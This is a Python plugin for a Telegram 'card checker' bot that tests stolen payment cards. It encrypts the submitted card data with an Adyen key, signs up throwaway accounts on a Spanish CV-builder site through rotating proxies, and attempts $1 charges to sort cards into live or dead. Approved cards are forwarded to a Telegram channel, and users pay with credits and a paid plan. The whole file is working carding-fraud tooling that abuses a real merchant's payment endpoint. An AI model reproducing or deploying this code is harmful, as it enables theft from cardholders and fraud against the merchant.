import json
import base64
import requests
from Plugins.SegundoPlano.antispam import *
from parse import parseX
import check_template
import adyen18
import names
import pytz
import re
import AdyenEncrypt
import uuid
import datetime
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Adyen"
subtype = "Charge $1"
command = "yen"

adyen_public_key = "10001|B147612EC8854DAFBED676489C7A391C8D621ECCA2758ED0D6F316AF33838F457A02643921965A54B1ACA618A6A64017407BFEA5F908654CCBC36F97C2F2C0D0479784EB57293DB74D831DA9562573EFF1860E5210185F5C4545E079077853EB93E7A3EA959874F9A9609CC723030749660145273866BFC44EA2F8CE0A1040CC6BB15AB513A0E41B9175B535A226951731464A185EA93421F96279E6177D3A1E0964879907A07353BA53663E7E3724167704517726C8FD7E039A4DB6BF50C580B1752CBAC9DB32B3A7DCB4E9ACB67CB9DF750F2458AA31C7376E934FA18E6B402FCE25D1DED4308610E305BD7B9CBD6CBD1910E52AA92FFEDAF8BEC97D4DBCF3"

my_encryptor = adyen18.encryptor(adyen_public_key)


holder_name = "John Doe"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def braintree3(client, message, command=command):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
━━━━━✧𝑲𝒖𝒓𝒂𝒎𝒂𝑪𝒉𝒌✧━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] STATUS ↯ <code>MANTENIMIENTO | OFF ❌</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] GATEWAY ↯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] SUBTYPE ↯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] USE ↯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] VERSIÓN ↯ 6.0
━━━━━━━━━✧♛✧━━━━━━━━  </b> """, reply_markup=keyboard)
    username = message.from_user.username
    chat_id = message.chat.id
    user_id = message.from_user.id
    command = command
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    spam_message = antispam(user_id, command, message)
    if spam_message is not None:
        message.reply(spam_message)
        return        
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
            
    except:
        pass
        
    
    try:
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('⚠️Error: Banned BIN. Please try another method.⚠️')
                return
        
    except:
        pass
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned bot❌. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Staff", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @luisabinader1 ❌</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
        
    
    
    if user_data[1] is not None:
        current_credits = int(user_data[1])
    else:
        current_credits = 0
        
    if current_credits <= 1:
            message.reply(f"You do not have enough credits.  ")
            return 
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Subtype ↯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Use ↯ <code>${command} cc|month|year|cvv</code>
━━━━━━━━━━━━━━━━
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>DECLINED ❌</b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Result ↯ Card Invalid!
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Checked by ↯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bot by ↯ @luisabinader1

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    # Obtener la fecha de generación en el formato necesario
    generation_time = datetime.datetime.now(tz=pytz.timezone('UTC')).strftime('%Y-%m-%dT%H:%M:%S.000Z')

    # Crear un diccionario con todos los datos de la tarjeta de crédito, incluyendo la fecha de generación
    card_data = {
        'number': ccnum,
        'cvc': cvv,
        'expiryMonth': mes,
        'expiryYear': ano,
        'holderName': holder_name,  # Agregar el nombre del titular de la tarjeta
        'generationtime': generation_time  # Asegúrate de incluir la fecha de generación aquí
    }
                


    # Cifrar todos los campos de la tarjeta de crédito juntos
    encrypted_data = my_encryptor.encrypt_from_dict(card_data)
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] 𝑲𝒖𝒓𝒂𝒎𝒂 𝑪𝒉𝒌
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Gateway ↯ <code>{name_gate} {subtype}</code>   
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] CC ↯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Status ↯ <b>Loading...</b> 
━━━━━━━━━━━━━━━━
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bin ↯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Country ↯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">✯</a>] Bank ↯ <code>{x.get("bank_name")}</code>
━━━━━━━━━━━━━━━━  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    correorand = f"darwindev{random.randint(1000000,9999999)}@gmail.com"
    
    

    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()

    #------------------- #1 Requests -------------------#
# Obtener la fecha de generación en el formato necesario
    generation_time = datetime.datetime.now(tz=pytz.timezone('UTC')).strftime('%Y-%m-%dT%H:%M:%S.000Z')

 
    


    # Cifrar todos los campos de la tarjeta de crédito juntos
    encrypted_data = my_encryptor.encrypt_from_dict(card_data)

    
    correorand = f"darwindev{random.randint(1000000,9999999)}@gmail.com"


    session = requests.Session()
    


    
    headers = {
        'Referer': 'https://app.onlinecv.es/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }

    json_data = {
        'user': correorand,
        'password': 'Kurama#1212',
    }

    response = session.post('https://app.onlinecv.es/api-public-v15/user/signup', headers=headers, json=json_data)
    

    
    sessiontoken = response.json()['accessToken']

    headers = {
        'authority': 'app.onlinecv.es',
        'accept': '*/*',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        # 'cookie': 'cv_channel_context=eyJjb3JyZWxhdGlvbl9pZCI6IjY0NTc4ZGQ0LTBjYjAtNDQxYi05Y2UyLTMzY2I2MmJmYzZhZiIsInV0bV9zb3VyY2UiOiJiaW5nIiwidXRtX21lZGl1bSI6ImNwYyIsInV0bV9jYW1wYWlnbiI6IkNPVU5UUllfQ09fRVMiLCJ1dG1fY29udGVudCI6IkhvamEgZGUgdmlkYSIsInV0bV9vcmlnaW4iOiIiLCJ1dG1fZG9jdW1lbnQiOiIiLCJ1dG1fYWlkIjoiIiwiZ2NsaWQiOiIiLCJtc2Nsa2lkIjoiYmM4Yzk2ODRmMGUxMTM4MTFmNWVmMzVhZTNjNGY1MWMiLCJsYW5kaW5nIjoiaHR0cHM6Ly93d3cub25saW5lY3YuZXMvbHMvaGFjZXItaG9qYS1kZS12aWRhLz91dG1fc291cmNlPWJpbmcmdXRtX21lZGl1bT1jcGMmbXNjbGtpZD1iYzhjOTY4NGYwZTExMzgxMWY1ZWYzNWFlM2M0ZjUxYyZ1dG1fY2FtcGFpZ249Q09VTlRSWV9DT19FUyZ1dG1fdGVybT1ob2phJTIwZGUlMjB2aWRhJTIwb25saW5lJnV0bV9jb250ZW50PUhvamElMjBkZSUyMHZpZGEiLCJyZWZlcnJlciI6Imh0dHBzOi8vd3d3LmJpbmcuY29tLyIsInRpbWV6b25lIjoiQW1lcmljYS9Cb2dvdGEifQ==; _gcl_au=1.1.126442352.1709053490; _ga=GA1.1.271981162.1709053491; _clck=q3e2wx%7C2%7Cfjm%7C0%7C1518; _uetvid=5274cff0d59211eea3664d7f390c018a; _uetmsclkid=_uetbc8c9684f0e113811f5ef35ae3c4f51c; _fw_crm_v=50852f2b-baa5-4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV_vwo_uuid=D23C47E719AA9839F62437D333D5C156F; _vwo_ds=3%241709053495%3A69.27970227%3A%3A; _vis_opt_exp_1011_combi=2; sectionsshowncvs=MjQwNWQxOGQtYmQ3ZC00NjE2LWExN2ItNTkwMzkyY2YwZGUx; _vis_opt_exp_1011_goal_4=1; AMP_MKTG_d02ff968bf=JTdCJTdE; _hjSessionUser_1685265=eyJpZCI6ImE0YTI0NmZiLTQ4YTYtNTRlOC05YzY2LTExODQ5ZTc4MWRlNCIsImNyZWF0ZWQiOjE3MDkwNTM1MjMwODEsImV4aXN0aW5nIjp0cnVlfQ==; _vis_opt_exp_1011_goal_2=1; apay-session-set=k89zAEPsqf8UPujesRR9fCyec7x%2Fh6B8i%2F4HxBiqhmjTHTGcJveNKdxaBoTZho8%3D; _vis_opt_s=4%7C; _vis_opt_test_cookie=1; testAB-RC-23056=true; cv_session_routing=59102b6f2141a69e477b16931980de87; _dd_s=rum=1&id=7187340f-6bc1-4a2e-97a7-6dba83a9bd63&created=1709159072933&expire=1709159979311; first_session=%7B%22visits%22%3A17%2C%22start%22%3A1709053495984%2C%22last_visit%22%3A1709159085904%2C%22url%22%3A%22https%3A%2F%2Fapp.onlinecv.es%2Feditor%2Fcv%2F%22%2C%22path%22%3A%22%2Feditor%2Fcv%2F%22%2C%22referrer%22%3A%22https%3A%2F%2Fwww.onlinecv.es%2F%22%2C%22referrer_info%22%3A%7B%22host%22%3A%22www.onlinecv.es%22%2C%22path%22%3A%22%2F%22%2C%22protocol%22%3A%22https%3A%22%2C%22port%22%3A80%2C%22search%22%3A%22%22%2C%22query%22%3A%7B%7D%7D%2C%22search%22%3A%7B%22engine%22%3Anull%2C%22query%22%3Anull%7D%2C%22prev_visit%22%3A1709155613366%2C%22time_since_last_visit%22%3A3472538%2C%22version%22%3A0.4%7D; _vwo_sn=105576%3A6; cv_amplitude_data=https://app.onlinecv.es/#/signin; AMP_d02ff968bf=JTdCJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJkZXZpY2VJZCUyMiUzQSUyMjQ2OWYxMDBmLTBhZjAtNGE5Ny05MzliLWY4MmZlYjNjYTEzYyUyMiUyQyUyMmxhc3RFdmVudFRpbWUlMjIlM0ExNzA5MTU5MDk2MDU3JTJDJTIyc2Vzc2lvbklkJTIyJTNBMTcwOTE1OTA4MzEwNSUyQyUyMnVzZXJJZCUyMiUzQSUyMjlhMzNkNWZlZDM5MGNlNmZiNGU4OGQ1NWNiZDc3ZTZmN2E0YmMzOTQlMjIlN0Q=; _ga_G8LT5WVT9F=GS1.1.1709155580.3.1.1709159096.45.0.0',
        'referer': 'https://app.onlinecv.es/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }

    params = {
        'accountLanguage': 'es-ES',
    }


    response = session.get('https://app.onlinecv.es/api-public-v15/visitor', params=params, headers=headers).json()

    cooki = response['cookie']
    print(cooki)
    
    headers = {
        'authority': 'app.onlinecv.es',
        'cookie': f'{cooki}',
        'origin': 'https://app.onlinecv.es',
        'referer': 'https://app.onlinecv.es/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
    }


    json_data = {
        'providerToken': sessiontoken
    }

    response = session.post('https://app.onlinecv.es/api-public-v15/user/authtoken/cognito', headers=headers, json=json_data).json()

    authToken = response['authToken']
    
    headers = {
        'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Microsoft Edge";v="122"',
        'sec-ch-ua-mobile': '?0',
        'Authorization': authToken,
        'cookie': f'{cooki}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0',
        'content-type': 'application/json',
        'accept': 'application/json',
        'Referer': 'https://app.onlinecv.es/payment/e9042507-8794-4a56-a592-90351d858920/?pn=f1b14250-92e4-467a-a151-25aafda9f05f',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'provider': 'f1b14250-92e4-467a-a151-25aafda9f05f',
        'productId': '5c25472b-fa56-49cd-b8a8-5a0e247975c6',
        'currency': 'USD',
        'formId': 'e9042507-8794-4a56-a592-90351d858920',
        'cipheredData': encrypted_data,
    }

    response = session.post('https://app.onlinecv.es/api-public-v15/debit', headers=headers, json=json_data).json()
    print(response)
    
    
    subscriptionId = response['subscriptionId']

    print(subscriptionId)

    headers = {
        'authority': 'app.onlinecv.es',
        'accept': 'application/json',
        'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'authorization': authToken,
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0',
    }

    params = {
        'subscriptionId': subscriptionId,
        #'c': '1709056413903',
    }

    response = session.get('https://app.onlinecv.es/api-public-v15/debit', params=params, headers=headers).text

    print(response)

    time.sleep(5)
    response = session.get('https://app.onlinecv.es/api-public-v15/debit', params=params, headers=headers).json()
    
    if "errorMessage" in response:
        status = response['errorMessage']
        if 'PENDING' in status:
            msg = 'APPROVED 3D✅'
            respuesta = status
            
        
            
        elif 'Authorised' in status:
            msg = 'APPROVED CHARGE $1 ✅'
            respuesta = status
            
        elif 'AUTHORIZED' in status:
            msg = 'APPROVED CHARGE $1 ✅'
            respuesta = status
            
        elif 'AUTHORIZED' in status:
            msg = 'APPROVED CHARGE $1 ✅'
            respuesta = status
            
        elif 'Not enough balance' in status:
            msg = 'APPROVED CVV✅'
            respuesta = status
            
        elif 'CVC Declined' in status:
            msg = 'APPROVED CCN✅'
            respuesta = status
            
        else:
            msg = 'DECLINED ❌'
            respuesta = status
            
        print(respuesta)
        
    elif "status" in response:
        codee = response['status']
        print(codee)
    
        if 'waiting_user_interaction' in codee:
        
            msg = 'APPROVED ✅'
            respuesta = 'REQUIRED 3D'
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            current_credits = int(user_data[1])

            # Restar 2 crédito
            new_credits = current_credits - 2

            # Actualizar créditos en la tabla users
            update_query = "UPDATE users SET creditos = ? WHERE user_id = ?"
            update_data = (new_credits, user_id)
            cursor.execute(update_query, update_data)
            conn.commit()
            
            # Obtener créditos actuales del usuario
            select_query = "SELECT creditos FROM users WHERE user_id = ?"
            cursor.execute(select_query, (user_id,))
            current_credits = cursor.fetchone()[0]
            
            message.reply(f"<b>2 Credits have been deducted, Remaining: {current_credits} </b>")
            loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

            chat_id = -1002000802973

            return client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))

        elif 'accepted' in codee:
        
            msg = 'APPROVED ✅'
            respuesta = 'CHARGE $1'
            proxyy = "LIVE 🟩"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            current_credits = int(user_data[1])

            # Restar 2 crédito
            new_credits = current_credits - 2

            # Actualizar créditos en la tabla users
            update_query = "UPDATE users SET creditos = ? WHERE user_id = ?"
            update_data = (new_credits, user_id)
            cursor.execute(update_query, update_data)
            conn.commit()
            
            # Obtener créditos actuales del usuario
            select_query = "SELECT creditos FROM users WHERE user_id = ?"
            cursor.execute(select_query, (user_id,))
            current_credits = cursor.fetchone()[0]
            
            message.reply(f"<b>2 Credits have been deducted, Remaining: {current_credits} </b>")
            
            
            loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

            chat_id = -1002000802973

            return client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))



    proxyy = "LIVE 🟩"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    
    if "APPROVED" in msg:
        current_credits = int(user_data[1])

        # Restar 2 crédito
        new_credits = current_credits - 2

        # Actualizar créditos en la tabla users
        update_query = "UPDATE users SET creditos = ? WHERE user_id = ?"
        update_data = (new_credits, user_id)
        cursor.execute(update_query, update_data)
        conn.commit()
        
        # Obtener créditos actuales del usuario
        select_query = "SELECT creditos FROM users WHERE user_id = ?"
        cursor.execute(select_query, (user_id,))
        current_credits = cursor.fetchone()[0]
        
        return message.reply(f"<b>2 Credits have been deducted, Remaining: {current_credits} </b>")
        
    
